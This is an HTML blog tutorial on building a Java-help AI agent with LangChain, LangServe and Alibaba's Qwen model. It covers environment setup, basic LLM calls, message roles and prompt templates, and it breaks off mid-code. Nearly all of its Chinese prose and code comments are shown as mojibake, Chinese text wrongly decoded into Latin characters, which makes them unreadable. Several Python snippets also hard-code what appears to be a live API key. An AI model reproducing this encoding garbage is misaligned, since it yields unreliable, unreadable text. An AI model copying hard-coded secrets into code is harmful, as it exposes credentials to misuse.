.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. é¡¹ç›®ä»‹ç»</h2>
<p>ä½¿ç”¨ LangChain æ¡†æ¶ä»¥åŠ LangServe å¹¶ç»“åˆé˜¿é‡Œäº‘ dashscope qwen å¤§æ¨¡å‹ å¼€å‘çš„ ä¸“ä¸ºè§£å†³ Java å¼€å‘é—®é¢˜ AI æ™ºèƒ½ä½“ï¼Œå®ç°äº† RAG(æ£€ç´¢å¢å¼º)ï¼ŒçŸ¥è¯†åº“ï¼Œå‘é‡è½¬åŒ–ï¼Œæ–‡æ¡£åˆ†å‰²ï¼ŒåŸºäº sqllite çš„å¯¹è¯è®°å¿†ï¼ŒåŸºäº redis çš„è¯­ä¹‰åŒ–ç¼“å­˜ï¼Œå·¥å…·è°ƒç”¨ã€‚</p>
<h2 data-id="heading-1">2. æŠ€æœ¯æ ˆ</h2>
<ul>
<li>python3.11</li>
<li>LangChain æ¡†æ¶ï¼šå®ç°æ ¸å¿ƒçš„æ™ºèƒ½ä½“é€»è¾‘ï¼ŒåŒ…æ‹¬å·¥å…·è°ƒç”¨ï¼ŒRAGï¼ŒçŸ¥è¯†åº“ï¼Œå‘é‡è½¬åŒ–ï¼Œå¯¹è¯è®°å¿†ï¼Œç¼“å­˜ç­‰</li>
<li>LangServe:å®ç°å¯¹å¤–æš´éœ²å¯è°ƒç”¨çš„ http æ¥å£åŠŸèƒ½</li>
<li>FastAPI:é…åˆ LangServe å¯¹å¤–æš´éœ²ä¸€ç³»åˆ—æ¥å£ï¼Œæä¾›æœåŠ¡</li>
<li>SlowAPI:ä¿æŠ¤ FastAPI æ‰€æš´éœ²æ¥å£ï¼Œå®ç°æ¥å£çš„é™æµ</li>
<li>Redis:å®ç°åŸºäº redis çš„è¯­ä¹‰åŒ–ç¼“å­˜ï¼Œæå‡æ•´ä¸ªç³»ç»Ÿçš„å“åº”é€Ÿåº¦å’Œæ€§èƒ½</li>
<li>sqlliteï¼ˆpy å†…ç½®ï¼‰ï¼šå®ç°æœ¬åœ°çš„ sql å¯¹è¯è®°å¿†</li>
<li>Chroma æœ¬åœ°å‘é‡æ•°æ®åº“ï¼šå­˜å‚¨åˆ‡å‰²åæ–‡æœ¬å—çš„å‘é‡å€¼</li>
</ul>
<h2 data-id="heading-2">3. æ ¸å¿ƒåŠŸèƒ½</h2>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ™ºèƒ½ä½“å®ŒæˆåŸºæœ¬çš„å¯¹è¯ï¼Œç³»ç»Ÿå†…éƒ¨è¿˜ä¼šæ ¹æ®ç°æœ‰çš„çŸ¥è¯†åº“æ–‡æ¡£ï¼Œè¾¾åˆ°ç±»ä¼¼å¢å¼º ai çŸ¥è¯†é¢çš„åŠŸèƒ½ï¼Œè®© ai å›å¤çš„æ•ˆæœæ›´å¥½ï¼Œå½“çŸ¥è¯†åº“å†…å®¹ä¸è¶³ä»¥æ”¯æ’‘ ai å›ç­”ç”¨çš„é—®é¢˜çš„æ—¶å€™ï¼Œè¿˜å¯ä»¥è‡ªåŠ¨è¿›è¡Œè”ç½‘æœç´¢ï¼Œè¿›è¡Œç½‘é¡µæŠ“å–ï¼Œè¿›ä¸€æ­¥è®© ai å›å¤çš„æ•ˆæœæ›´å‡†ç¡®</p>
<h2 data-id="heading-3">4. ç¯å¢ƒæ­å»º</h2>
<h3 data-id="heading-4">4.1 æ­å»ºPythonå¼€å‘ç¯å¢ƒ</h3>
<p>-é¦–å…ˆå‡†å¤‡å¥½æœ¬åœ°çš„ python ç¯å¢ƒï¼ˆ3.11ï¼‰ï¼Œä½¿ç”¨ pycharm åˆ›å»ºä¸€ä¸ª python é¡¹ç›® <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e889e031cd2b4ba48e38e66e9e81b07e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSf5oCn55qE56iL5bqP5ZGY5bCP546L:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770491&amp;x-signature=hbjibhvuIjvyBlZLX%2FmGcNSMd6A%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>å¦‚å›¾æ‰€ç¤ºï¼Œè¿™é‡Œè¦ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒï¼Œä»¥ä¾¿äºæˆ‘ä»¬åšå®Œé¡¹ç›®ä¹‹åå°±å¯ä»¥ç›´æ¥å°†é¡¹ç›®çš„æ–‡ä»¶å¤¹ç›´æ¥æ‰“æˆä¸€ä¸ªå‹ç¼©åŒ…å‘ç»™å…¶ä»–äººæˆ–è€…ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç›´æ¥æ¿€æ´»è™šæ‹Ÿç¯å¢ƒï¼Œä½¿ç”¨<strong>python</strong>å‘½ä»¤ç›´æ¥è¿è¡Œ main.py å°±èƒ½ç›´æ¥å¯åŠ¨è¿™ä¸ªé¡¹ç›®ï¼Œè€Œä¸ç”¨å†å»ä½¿ç”¨<strong>pip install</strong>å»å®‰è£…æ‰€éœ€çš„ç¬¬ä¸‰æ–¹åº“</p>
</li>
<li>
<p>ç‚¹å‡» create å°±å¾—åˆ°äº†ä¸€ä¸ªæ–°çš„ python é¡¹ç›® <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ad90b6b62b5430a8d6ecf781a63ace7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSf5oCn55qE56iL5bqP5ZGY5bCP546L:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770491&amp;x-signature=Lp6K4B5XMN58oB1T5hL5QkdYYjw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">ä½¿ç”¨ LangChain æ¡†æ¶è¿›è¡Œ ReAct AI æ™ºèƒ½ä½“å¼€å‘</h3>
<p>1ã€ä»€ä¹ˆæ˜¯ ReAct æ™ºèƒ½ä½“ï¼Ÿ -ReAct æ˜¯ä¸€ç§ç»“åˆæ¨ç†ï¼ˆReasoningï¼‰å’Œè¡ŒåŠ¨ï¼ˆActingï¼‰çš„è®¾è®¡æ€æƒ³ï¼Œæ—¨åœ¨ä½¿ AI æ™ºèƒ½ä½“åœ¨å¤æ‚å’ŒåŠ¨æ€çš„ç¯å¢ƒä¸­æ›´æœ‰æ•ˆåœ°å·¥ä½œã€‚ReAct ç”± Google Research çš„ Brain Team äº 2022 å¹´ 10 æœˆæå‡ºï¼Œæ˜¯ Auto-GPT ç­‰ AI Agent çš„åŸºç¡€ç»„ä»¶ã€‚ è¯´äººè¯å°±æ˜¯è®© AI æ›´æ™ºèƒ½æ›´åƒäººï¼Œäººå’ŒåŠ¨ç‰©çš„æœ€å¤§åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Œäººå¯ä»¥æ€è€ƒï¼Œå¯ä»¥ä½¿ç”¨å·¥å…·å¯¹å§ã€‚æ‰€ä»¥åœ¨è®© AI å›ç­”æˆ‘ä»¬çš„é—®é¢˜çš„æ—¶å€™ï¼Œä¹Ÿè®©ä»–æ·±åº¦æ€è€ƒæˆ‘ä»¬æ‰€æå‡ºçš„é—®é¢˜ï¼Œå¹¶è¿›è¡ŒåŠ¨æ€çš„å†³ç­–ï¼Œæ˜¯å¦éœ€è¦ä½¿ç”¨å·¥å…·</p>
<p>2ã€é‚£ LangChain åˆæ˜¯ä¸€ä¸ªä»€ä¹ˆæ¡†æ¶ï¼Œæˆ‘ä»¬æ¥çœ‹å®˜æ–¹è§£é‡Š</p>
<p><strong>LangChain æ˜¯ä¸€ä¸ªç”¨äºå¼€å‘ç”±è¯­è¨€æ¨¡å‹é©±åŠ¨çš„åº”ç”¨ç¨‹åºçš„æ¡†æ¶ã€‚å®ƒä½¿å¾—åº”ç”¨ç¨‹åºèƒ½å¤Ÿï¼š å…·æœ‰ä¸Šä¸‹æ–‡æ„ŸçŸ¥èƒ½åŠ›ï¼šå°†è¯­è¨€æ¨¡å‹è¿æ¥åˆ°ä¸Šä¸‹æ–‡æ¥æºï¼ˆæç¤ºæŒ‡ä»¤ï¼Œå°‘é‡çš„ç¤ºä¾‹ï¼Œéœ€è¦å›åº”çš„å†…å®¹ç­‰ï¼‰ å…·æœ‰æ¨ç†èƒ½åŠ›ï¼šä¾èµ–è¯­è¨€æ¨¡å‹è¿›è¡Œæ¨ç†ï¼ˆæ ¹æ®æä¾›çš„ä¸Šä¸‹æ–‡å¦‚ä½•å›ç­”ï¼Œé‡‡å–ä»€ä¹ˆè¡ŒåŠ¨ç­‰ï¼‰ è¿™ä¸ªæ¡†æ¶ç”±å‡ ä¸ªéƒ¨åˆ†ç»„æˆã€‚ LangChain åº“ï¼šPython å’Œ JavaScript åº“ã€‚åŒ…å«äº†å„ç§ç»„ä»¶çš„æ¥å£å’Œé›†æˆï¼Œä¸€ä¸ªåŸºæœ¬çš„è¿è¡Œæ—¶ï¼Œç”¨äºå°†è¿™äº›ç»„ä»¶ç»„åˆæˆé“¾å’Œä»£ç†ï¼Œä»¥åŠç°æˆçš„é“¾å’Œä»£ç†çš„å®ç°ã€‚ LangChain æ¨¡æ¿ï¼šä¸€ç³»åˆ—æ˜“äºéƒ¨ç½²çš„å‚è€ƒæ¶æ„ï¼Œç”¨äºå„ç§ä»»åŠ¡ã€‚ LangServeï¼šä¸€ä¸ªç”¨äºå°† LangChain é“¾éƒ¨ç½²ä¸º REST API çš„åº“ã€‚ LangSmithï¼šä¸€ä¸ªå¼€å‘è€…å¹³å°ï¼Œè®©ä½ å¯ä»¥è°ƒè¯•ã€æµ‹è¯•ã€è¯„ä¼°å’Œç›‘æ§åŸºäºä»»ä½• LLM æ¡†æ¶æ„å»ºçš„é“¾ï¼Œå¹¶ä¸”ä¸ LangChain æ— ç¼é›†æˆã€‚</strong> è¿™æ˜¯ LangChain çš„å®˜æ–¹æ¶æ„å›¾ <img src="https://python.langchain.com/svg/langchain_stack.svg" alt="" loading="lazy"/></p>
</li>
</ul>
<p>æˆ‘ä»¬ä¼šä½¿ç”¨ LangChain å¼€ç¼–å†™ AI åº”ç”¨ï¼Œå¿«é€Ÿå¼€å§‹ï¼ŒåŒæ—¶ä½¿ç”¨ LangServe æ¥å°† LangChain ä¸­çš„ä»»ä½•é“¾è½¬åŒ–ä¸º API</p>
<h3 data-id="heading-6">4.2LangChain å¿«é€Ÿå…¥é—¨</h3>
<h4 data-id="heading-7">1ã€ LangChain åº“æœ‰å‡ ä¸ªæ ¸å¿ƒçš„ä¸åŒçš„åŒ…ç»„æˆï¼Œ</h4>
<ul>
<li>langchian-core:æä¾› LangChain çš„è¡¨è¾¾å¼è¯­è¨€å’ŒåŸºç¡€çš„åŠŸèƒ½</li>
<li>langchain-community:æä¾›äº†ç¬¬ä¸‰æ–¹çš„ llm é›†æˆï¼Œæ¯”å¦‚é˜¿é‡Œäº‘ dashcopeï¼Œæ™ºè°± AIï¼ŒOpenAIï¼Œä»¥åŠå’Œ OpenAI å…¼å®¹çš„ DeepSeek ç­‰ï¼Œä»¥åŠå…¶ä»–çš„å¤§æ¨¡å‹ï¼Œå…·ä½“å¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£</li>
<li>langchain:æ„æˆåº”ç”¨ç¨‹åºæ¶æ„çš„<strong>é“¾</strong>ã€ä»£ç†å’Œæ£€ç´¢ç­‰</li>
</ul>
<h4 data-id="heading-8">2ã€åœ¨å½“å‰çš„é¡¹ç›®ä¸­å®‰è£… LangChain</h4>
<ul>
<li>ä½¿ç”¨<strong>pip</strong>å‘½ä»¤å®‰è£… è¿›å…¥åˆ°å·²ç»åˆ›å»ºå®Œæ¯•çš„é¡¹ç›®çš„ç»ˆç«¯ï¼Œè¾“å…¥<strong>pip install langchain</strong> <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/64793310906e4d02b3994e0383da98c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSf5oCn55qE56iL5bqP5ZGY5bCP546L:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770491&amp;x-signature=i2pQX7yOlWTwKZE772ENajODjSQ%3D" alt="" loading="lazy"/> ps: ç”±äºè¦è¿æ¥å¤–ç½‘ï¼Œä¸‹è½½é€Ÿåº¦ä¼šæ¯”è¾ƒæ…¢ã€‚è¿˜æœ‰å°±æ˜¯ï¼Œå¦‚æœå‘ç°ä½ å®‰è£…äº†ï¼Œä½†æ˜¯åœ¨ä»£ç ä¸­å¼•å…¥ langchian çš„æ—¶å€™è¿˜æ˜¯æŠ¥æ‰¾ä¸åˆ°çš„é”™è¯¯ï¼ˆå› ä¸ºæ²¡æœ‰å®‰è£…åˆ°è™šæ‹Ÿç¯å¢ƒä¸­ï¼Œè€Œæ˜¯å…¨å±€çš„ python ç¯å¢ƒä¸­ï¼‰ã€‚é‚£å°±ä½¿ç”¨ä¸‹é¢ä¸€ç§æ–¹å¼å®‰è£…</li>
<li>ä½¿ç”¨ pycharm å®‰è£… æ‰“å¼€ä¸‹é¢çš„çª—å£ï¼Œç‚¹å‡»åŠ å· <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0005d682a0542d790b99eec330d41b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSf5oCn55qE56iL5bqP5ZGY5bCP546L:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770491&amp;x-signature=TerrlyRPx%2B5AdiAfFgWgTa8CIag%3D" alt="" loading="lazy"/> æœç´¢<strong>langchian</strong> <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34383d4e76be47e9824967fce079838e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSf5oCn55qE56iL5bqP5ZGY5bCP546L:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770491&amp;x-signature=hVZeqpzR8UKdmQqt2pVzJ%2BAQrZ4%3D" alt="" loading="lazy"/> ç‚¹å‡»<strong>install package</strong>å³å¯ï¼Œè¿™ä¸ªè¿‡ç¨‹åŒæ ·éœ€è¦è¿æ¥å¤–ç½‘ã€‚</li>
</ul>
<h4 data-id="heading-9">3ã€åˆæ¬¡ä½“éªŒè°ƒç”¨ llm</h4>
<ul>
<li>
<p>åœ¨å½“å‰é¡¹ç›®æ ¹ç›®å½•æ–°å»º test æ–‡ä»¶å¤¹ï¼Œå¹¶åœ¨æ–‡ä»¶å¤¹ä¸­æ–°å»º py æ–‡ä»¶ <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f2ce884316947b2aa84af7ef553b460~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSf5oCn55qE56iL5bqP5ZGY5bCP546L:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770491&amp;x-signature=fpMa%2FnfV0A2tkKBpulmQsewSDHo%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ä»¬æ¥ç¼–å†™æµ‹è¯•ä»£ç </p>
</li>
</ul>

<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># æˆ‘ä»¬ä½¿ç”¨é˜¿é‡Œäº‘çš„qwenå¤§æ¨¡å‹ï¼Œå€’å…¥æ ¸å¿ƒåŒ…</span>
from langchain_community.chat_models import ChatTongyi

<span class="hljs-comment"># åˆå§‹åŒ–ä¸€ä¸ªllmå¯¹è±¡</span>
<span class="hljs-attr">llm</span> = ChatTongyi(
    <span class="hljs-comment"># ä½¿ç”¨qwen-plusæ¨¡å‹</span>
    <span class="hljs-attr">model</span>=<span class="hljs-string">"qwen-plus"</span>,
    <span class="hljs-comment"># ä»é˜¿é‡Œäº‘å®˜ç½‘è·å–apikey,å…·ä½“è·å–æ–¹å¼çœ‹å®˜æ–¹æ–‡æ¡£ï¼šhttps://help.aliyun.com/zh/model-studio/get-api-key</span>
    <span class="hljs-attr">api_key</span>=<span class="hljs-string">"sk-3e4b3b0a5513440f80a23349057c653f"</span>,
)
<span class="hljs-comment"># è°ƒç”¨invokeå‡½æ•°ï¼Œå¹¶ä¼ å…¥ä¸€ä¸ªæç¤ºè¯</span>
<span class="hljs-attr">res</span> = llm.invoke(<span class="hljs-string">"ä½ å¥½ï¼Œä½ æ˜¯è°"</span>)
print(res)
</code></pre>
<p>æ§åˆ¶å°è¾“å…¥ç»“æœå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">content=<span class="hljs-string">'ä½ å¥½ï¼æˆ‘æ˜¯é€šä¹‰åƒé—®ï¼ˆQwenï¼‰ï¼Œæ˜¯é˜¿é‡Œå·´å·´é›†å›¢æ——ä¸‹çš„é€šä¹‰å®éªŒå®¤è‡ªä¸»ç ”å‘çš„è¶…å¤§è§„æ¨¡è¯­è¨€æ¨¡å‹ã€‚æˆ‘å¯ä»¥å¸®åŠ©ä½ å›ç­”é—®é¢˜ã€åˆ›ä½œæ–‡å­—ã€è¿›è¡Œé€»è¾‘æ¨ç†ã€ç¼–ç¨‹ç­‰ä»»åŠ¡ã€‚æ— è®ºæ˜¯å†™æ•…äº‹ã€å†™å…¬æ–‡ã€å†™é‚®ä»¶ï¼Œè¿˜æ˜¯èŠå¤©ã€ç¿»è¯‘ã€æä¾›ä¿¡æ¯æŸ¥è¯¢ï¼Œæˆ‘éƒ½å¯ä»¥å°½åŠ›ä¸ºä½ æä¾›å¸®åŠ©ã€‚æœ‰ä»€ä¹ˆæˆ‘å¯ä»¥å¸®åˆ°ä½ çš„å—ï¼ŸğŸ˜Š'</span> additional_kwargs={} response_metadata={<span class="hljs-string">'model_name'</span>: <span class="hljs-string">'qwen-plus'</span>, <span class="hljs-string">'finish_reason'</span>: <span class="hljs-string">'stop'</span>, <span class="hljs-string">'request_id'</span>: <span class="hljs-string">'da7f8a63-4864-46b8-89f6-fd733f1841db'</span>, <span class="hljs-string">'token_usage'</span>: {<span class="hljs-string">'input_tokens'</span>: 12, <span class="hljs-string">'output_tokens'</span>: 77, <span class="hljs-string">'total_tokens'</span>: 89, <span class="hljs-string">'prompt_tokens_details'</span>: {<span class="hljs-string">'cached_tokens'</span>: 0}}} <span class="hljs-built_in">id</span>=<span class="hljs-string">'run--f2c8a639-4f54-4ece-9afa-d3a59d32c233-0'</span>

Process finished with <span class="hljs-built_in">exit</span> code 0
</code></pre>
<p>è¿™æ ·å°±å®ç°äº†æœ€æœ€æœ€åŸºæœ¬çš„è°ƒç”¨ llmï¼Œé‚£è¿™æ ·å°±å®ç°äº†ä¸€ä¸ªæœ€æœ€æœ€åŸºæœ¬çš„ llm è°ƒç”¨ã€‚ é™¤äº†è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬æ¥çœ‹<strong>tongyi.py</strong>æ–‡ä»¶çš„æºä»£ç  åœ¨ä»–çš„æ„é€ å‡½æ•°ä¸­æœ‰è¿™ä¹ˆä¸€æ®µæ³¨é‡Š</p>
<pre><code class="hljs language-ini" lang="ini">  <span class="hljs-attr">messages</span> = [
                (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€åä¸“ä¸šçš„ç¿»è¯‘å®¶ï¼Œå¯ä»¥å°†ç”¨æˆ·çš„ä¸­æ–‡ç¿»è¯‘ä¸ºè‹±æ–‡ã€‚"</span>),
                (<span class="hljs-string">"human"</span>, <span class="hljs-string">"æˆ‘å–œæ¬¢ç¼–ç¨‹ã€‚"</span>),
            ]
            tongyi_chat.invoke(messages)
</code></pre>
<p>åœ¨è¿™é‡Œï¼Œå®šä¸€ä¸ªä¸€ä¸ª message åˆ—è¡¨ï¼Œåˆ—è¡¨ä¸­æ”¾äº†ä¸¤ä¸ªå…ƒç»„ï¼Œåˆ†åˆ«ä»£è¡¨ç³»ç»Ÿæç¤ºè¯ï¼Œæ‰€è°“ç³»ç»Ÿæç¤ºè¯å°±æ˜¯æˆ‘æå‰ç»™ä»–ä¸€ä¸ªé¢„è®¾ï¼Œç±»ä¼¼äºè§’è‰²æ‰®æ¼”ï¼Œè¿˜æœ‰å°±æ˜¯ humanï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ç”¨æˆ·çš„æç¤ºè¯ã€‚é‚£ä¹ˆè¿™ç§æ–¹å¼ï¼Œå°±ä¼šè®© llm çš„å›å¤æ›´ç²¾ç¡®</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># æˆ‘ä»¬ä½¿ç”¨é˜¿é‡Œäº‘çš„qwenå¤§æ¨¡å‹ï¼Œå€’å…¥æ ¸å¿ƒåŒ…ï¼Œè¿™é‡Œä½¿ç”¨äº†é˜¿é‡Œäº‘çš„dashscopeï¼Œéœ€è¦æŒ‰ç…§å®‰è£…langchainçš„æ–¹å¼å®‰è£…dashcope</span>
<span class="hljs-comment"># ä»€ä¹ˆæ˜¯dashcopeï¼Ÿå’Œé˜¿é‡Œäº‘ç™¾ç‚¼ä»€ä¹ˆåŒºåˆ«ï¼Ÿhttps://q.cnblogs.com/q/150279</span>
from langchain_community.chat_models import ChatTongyi

<span class="hljs-comment"># åˆå§‹åŒ–ä¸€ä¸ªllmå¯¹è±¡</span>
<span class="hljs-attr">llm</span> = ChatTongyi(
    <span class="hljs-comment"># ä½¿ç”¨qwen-plusæ¨¡å‹</span>
    <span class="hljs-attr">model</span>=<span class="hljs-string">"qwen-plus"</span>,
    <span class="hljs-comment"># ä»é˜¿é‡Œäº‘å®˜ç½‘è·å–apikey,å…·ä½“è·å–æ–¹å¼çœ‹å®˜æ–¹æ–‡æ¡£ï¼šhttps://help.aliyun.com/zh/model-studio/get-api-key</span>
    <span class="hljs-attr">api_key</span>=<span class="hljs-string">"sk-3e4b3b0a5513440f80a23349057c653f"</span>,
)
<span class="hljs-attr">messages</span> = [
    (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€åä¸“ä¸šçš„ç¿»è¯‘å®¶ï¼Œå¯ä»¥å°†ç”¨æˆ·çš„ä¸­æ–‡ç¿»è¯‘ä¸ºè‹±æ–‡ã€‚"</span>),
    (<span class="hljs-string">"human"</span>, <span class="hljs-string">"æˆ‘å–œæ¬¢ç¼–ç¨‹ã€‚"</span>),
]

<span class="hljs-comment"># è°ƒç”¨invokeå‡½æ•°ï¼Œå¹¶ä¼ å…¥æç¤ºè¯åˆ—è¡¨</span>
<span class="hljs-attr">res</span> = llm.invoke(messages)
print(res)
</code></pre>
<p>æ§åˆ¶å°è¾“å‡ºï¼š</p>
<pre><code class="hljs language-bash" lang="bash">content=<span class="hljs-string">'I like programming.'</span> additional_kwargs={} response_metadata={<span class="hljs-string">'model_name'</span>: <span class="hljs-string">'qwen-plus'</span>, <span class="hljs-string">'finish_reason'</span>: <span class="hljs-string">'stop'</span>, <span class="hljs-string">'request_id'</span>: <span class="hljs-string">'b7c9036a-9870-4e9e-a399-f1fbaee4a537'</span>, <span class="hljs-string">'token_usage'</span>: {<span class="hljs-string">'input_tokens'</span>: 30, <span class="hljs-string">'output_tokens'</span>: 4, <span class="hljs-string">'total_tokens'</span>: 34, <span class="hljs-string">'prompt_tokens_details'</span>: {<span class="hljs-string">'cached_tokens'</span>: 0}}} <span class="hljs-built_in">id</span>=<span class="hljs-string">'run--4ffe34d9-b85e-402e-abb1-7c75787abdbd-0'</span>

Process finished with <span class="hljs-built_in">exit</span> code 0
</code></pre>
<p>é‚£ä¸ºä»€ä¹ˆè¦å†™æˆ<strong>system</strong>å’Œ<strong>human</strong>å‘¢ï¼Ÿ</p>
<p>å…¶å® LangChain æä¾›äº†å‡ ä¸ªå¯¹è±¡ï¼Œç”¨äºæ–¹ä¾¿åœ°åŒºåˆ†ä¸åŒçš„è§’è‰²:</p>
<ul>
<li>HumanMessage: æ¥è‡ªäººç±»/ç”¨æˆ·çš„ ChatMessageã€‚</li>
<li>AIMessage: æ¥è‡ª AI/åŠ©æ‰‹çš„ ChatMessageã€‚</li>
<li>SystemMessage: æ¥è‡ªç³»ç»Ÿçš„ ChatMessageã€‚</li>
<li>FunctionMessage: æ¥è‡ªå‡½æ•°è°ƒç”¨çš„ ChatMessageã€‚</li>
</ul>
<h4 data-id="heading-10">4ã€langchain ç‰¹æ€§ä¹‹æç¤ºè¯æ¨¡æ¿</h4>
<p>æ‰€è°“æç¤ºè¯æ¨¡æ¿å°±æ˜¯ä¸€ä¸ªæ¡†æ¶ï¼Œä¸€æ®µé€šç”¨çš„è¯ï¼Œå¯ä»¥åœ¨è¿™ä¸ªåŸºç¡€ä¸Šå»ä¿®æ”¹ã€‚æƒ³æƒ³æˆ‘ä»¬ä¹‹å‰å†™è‹±è¯­ä½œæ–‡ï¼Œç»å¸¸èƒŒä¸€äº›æ¨¡æ¿ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªåŸºç¡€ä¸ŠåŠ ä¸Šæˆ‘ä»¬è‡ªå·±å†™çš„è‹±è¯­å¥å­ã€‚</p>
<p>åœ¨ langchian ä¸­çš„<strong>langchain_core.prompts</strong>åŒ…ä¸­æä¾›äº†<strong>ChatPromptTemplate</strong>,æ¥å®ç°æç¤ºè¯æ¨¡æ¿çš„åŠŸèƒ½ã€‚åœ¨ä»–çš„å­ç±»ä¸‹åŒæ—¶è¿˜æœ‰ï¼ˆå¦‚ SystemMessagePromptTemplate, HumanMessagePromptTemplateï¼‰ã€‚</p>
<p>æˆ‘ä»¬æ¥æ”¹é€ ä¸€ä¸‹ä¹‹å‰çš„ä»£ç </p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># æˆ‘ä»¬ä½¿ç”¨é˜¿é‡Œäº‘çš„qwenå¤§æ¨¡å‹ï¼Œå¯¼å…¥æ ¸å¿ƒåŒ…</span>
from langchain_community.chat_models import ChatTongyi
from langchain_core.prompts import ChatPromptTemplate

<span class="hljs-comment"># åˆå§‹åŒ–ä¸€ä¸ªllmå¯¹è±¡</span>
<span class="hljs-attr">llm</span> = ChatTongyi(
    <span class="hljs-attr">model</span>=<span class="hljs-string">"qwen-plus"</span>,
    <span class="hljs-attr">api_key</span>=<span class="hljs-string">"sk-3e4b3b0a5513440f80a23349057c653f"</span>,  <span class="hljs-comment"># å»ºè®®ä½¿ç”¨ç¯å¢ƒå˜é‡ç®¡ç†å¯†é’¥</span>
)

<span class="hljs-comment"># å®šä¹‰æç¤ºæ¨¡æ¿</span>
<span class="hljs-attr">prompt</span> = ChatPromptTemplate.from_messages([
    (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€åä¸“ä¸šçš„ç¿»è¯‘å®¶ï¼Œå¯ä»¥å°†ç”¨æˆ·çš„ä¸­æ–‡ç¿»è¯‘ä¸ºè‹±æ–‡ã€‚"</span>),
    (<span class="hljs-string">"human"</span>, <span class="hljs-string">"{text}"</span>),  <span class="hljs-comment"># ä½¿ç”¨å˜é‡å ä½ç¬¦</span>
])

<span class="hljs-comment"># æ ¼å¼åŒ–æç¤ºè¯ï¼ˆä¼ å…¥å®é™…å†…å®¹ï¼‰</span>
<span class="hljs-attr">formatted_prompt</span> = prompt.format_messages(text=<span class="hljs-string">"Javaæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„ç¼–ç¨‹è¯­è¨€ã€‚"</span>)

<span class="hljs-comment"># è°ƒç”¨æ¨¡å‹</span>
<span class="hljs-attr">res</span> = llm.invoke(formatted_prompt)

<span class="hljs-comment"># è¾“å‡ºç»“æœ,è¿™é‡Œç›´æ¥æ‹¿åˆ°aiå›å¤çš„contentå†…å®¹</span>
print(res.content)
</code></pre>
<p>æ§åˆ¶å°è¾“å‡ºï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet">Java <span class="hljs-built_in">is</span> the best programming language <span class="hljs-keyword">in</span> the world.

Process finished <span class="hljs-keyword">with</span> <span class="hljs-keyword">exit</span> code <span class="hljs-number">0</span>
</code></pre>
<p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨è¿™ä¸ªåŸºæœ¬çš„æç¤ºè¯æ¶å­ä¸Šï¼Œå¡«å……æˆ‘ä»¬æƒ³è¦é—®çš„å†…å®¹</p>
<p>åŒæ—¶<strong>ChatPromptTemplate</strong>è¿˜æä¾›äº†å¦å¤–ä¸€ä¸ªå‡½æ•°ï¼Œ<strong>from_template</strong> ä½¿ç”¨<strong>from_template</strong></p>
<pre><code class="hljs language-ini" lang="ini">from langchain_core.prompts import ChatPromptTemplate

<span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªåŒ…å«å ä½ç¬¦çš„æ¨¡æ¿</span>
<span class="hljs-attr">template</span> = <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„ç¿»è¯‘åŠ©æ‰‹ï¼Œè¯·å°†ä»¥ä¸‹å†…å®¹ç¿»è¯‘æˆ{target_language}ï¼š{text}"</span>
<span class="hljs-attr">prompt</span> = ChatPromptTemplate.from_template(template)

<span class="hljs-comment"># æ ¼å¼åŒ–æ¨¡æ¿</span>
<span class="hljs-attr">formatted_prompt</span> = prompt.format(
